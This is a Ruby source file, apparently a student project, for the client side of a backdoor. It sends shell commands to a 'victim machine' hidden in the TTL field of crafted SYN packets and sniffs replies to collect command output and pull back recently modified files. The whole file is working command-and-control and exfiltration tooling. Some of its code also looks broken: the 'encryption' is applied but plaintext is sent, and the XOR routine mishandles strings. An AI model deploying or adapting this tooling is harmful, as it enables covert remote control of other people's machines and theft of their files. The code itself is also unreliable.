#!/usr/bin/ruby
# A00746060
# Harjinder Daniel Khatkar
# Client.rb
# sudo ruby client.rb
#
# This program communicates with the backdoor on our victim machine.
# The user can insert basic shell commands and receive the results from the victim
# The user can also insert a 'get' command, which will send back the most recently
# modified file on the directory the backdoor is watching.
# The client will send and receive all data through a covert channel, byte by byte.
require 'rubygems'
require 'date'
require 'packetfu'
include PacketFu

# This is the client class which contains all client functions
class Client
    
    # global variables for information from the config file.
    @interface
    @date
    @serverIP
    @sourcePort
    @destPort
    @serverMac
    @myInfo

    # Start function to begin our client and loop continuously until we quit "ctrl-c"
    def start
        
        #read in information from client config file.
    	read_config()
    
	while true do
        file = ""
		puts "Type Command: "
		command = gets.chomp
		puts command
        send_command(command)
		puts "Waiting for Response from Server"
        
        # Check if we wish to receive the modified file from server, or just regular shell command.
		if command == "get"
            
            # Encrypted file name
			encrypted_name = receive_filename()
			puts encrypted_name
            # Decrypt file name from server
			file = xor(encrypted_name,@date)
			puts file
			if file == "ERROR"
				puts "No modified files on Server"
			else
				puts "Receiving #{file}"
				receive_file(file)
			end
		else
			puts "Receiving Results if Valid Command..."
			receive_results()
		end
	end
        # Catch the interrupt and kill the threads
        rescue Interrupt
        exit 0
    end
        
    # Function to send command to server.
    def send_command(command)
        
        # Encrypt command with XOR so cannot be seen.
        encrypted_command = xor(command, @date)
        
        # Send encrypted command byte by byte in ttl field to server
    	command.each_char do |c|
   		tcp_pkt = TCPPacket.new(:config => @myInfo)
		 	tcp_pkt.tcp_flags.syn=1
		 	tcp_pkt.ip_ttl = c
		 	tcp_pkt.tcp_dst= @destPort
		 	tcp_pkt.tcp_src= @sourcePort
		 	tcp_pkt.eth_daddr = @serverMac
		 	tcp_pkt.ip_daddr= @serverIP
		 	tcp_pkt.recalc
		 	tcp_pkt.to_w(@interface)
		 	puts tcp_pkt.ip_ttl
		 	sleep 0.1
		end
		puts "Command Sent"
        # Send final packet to tell server no more data is coming
		tcp_pkt = TCPPacket.new(:config => @myInfo)
		tcp_pkt.tcp_flags.syn=1
		tcp_pkt.ip_ttl = 0
		tcp_pkt.tcp_dst= @destPort.to_i
		tcp_pkt.tcp_src= @sourcePort.to_i
		tcp_pkt.eth_daddr = @serverMac
		tcp_pkt.ip_daddr= @serverIP
		tcp_pkt.recalc
		tcp_pkt.to_w(@interface)
		puts tcp_pkt.ip_ttl
        xor(command, @date)
    end
	 
    # Function to read from the client config file.
    # Takes in server IP, MAC and ports to send to. Also generates client information.
    def read_config()
        
        config = Array.new
        File.foreach("client_config.txt") {|line| 
            config.push(line)
        }
        @interface = config[0].strip
        @date = Date.today.to_s.strip
        @serverIP = config[1].strip
        @sourcePort = config[2].strip.to_i
        @destPort = config[3].strip.to_i
        @serverMac = Utils.arp(@serverIP, :iface => @interface) 
        @myInfo = Utils.whoami?(:iface => @interface)
        
    end
    
    # Function to receive filename from server.
    # This way we can create the file on our client.
    def receive_filename()
        
        filename = ""
        # Capture packets that are directed to port 8050 and only from the ServerIP
        # This is a form of authentication (kind of like port knocking)
        capture_session = Capture.new(:iface => @interface,
    					:start => true,
    					:promisc => true,
    					:filter => "dst port 8050 and src #{@serverIP}")
        
        # read packets from ttl field and add to file name
        capture_session.stream.each do |p|
    			pkt = Packet.parse(p)
							
    			char = pkt.ip_ttl
                puts char   
    			if char == 0
				puts "error"
    				return filename
    			end
			filename << char
        end
    end

    # Function to receive file from server.
    # Once packets start coming in we created the file on the local client machine
    def receive_file(file)
		i = 0
		
    		capture_session = Capture.new(:iface => @interface,
    						:start => true,
    						:promisc => true,
    						:filter => "dst port 8050 and src #{@serverIP}")
            # Open file for writing.
    		File.open(file, 'wb') {	|f|
    		capture_session.stream.each do |p|
    			pkt = Packet.parse(p)
							
    			char = pkt.ip_ttl
                puts char    
    			if char == 0
				puts "File Received"
				puts i
    				return
    			end
			i += 1
			f.write(char.chr) 
    		end
		}
    end
        
    # Function to receive command shell results executed on the server.
    # Results are printed to screen
    def receive_results()
		i = 0
		
    		capture_session = Capture.new(:iface => @interface,
    						:start => true,
    						:promisc => true,
    						:filter => "dst port 8050 and src #{@serverIP}")
        # Read ttl field and print to screen.
    		capture_session.stream.each do |p|
    			pkt = Packet.parse(p)
                print pkt.ip_ttl.chr			
    			char = pkt.ip_ttl    
    			if char == 0
                    puts "Results Received"
				if i == 0
				 	puts "Invalid Command"
				end
    				return
    			end
			i += 1
			
    		end
    end

    # Function to perform XOR encryption on command.
    def xor(input, key)
        x = input.length
        y = key.length

        z = x -1 
        for i in 1..z
            input[i] ^= key[(i%y)]
        end

	return input
    end

end

# Start our Client.
begin
	client = Client.new
	client.start
end
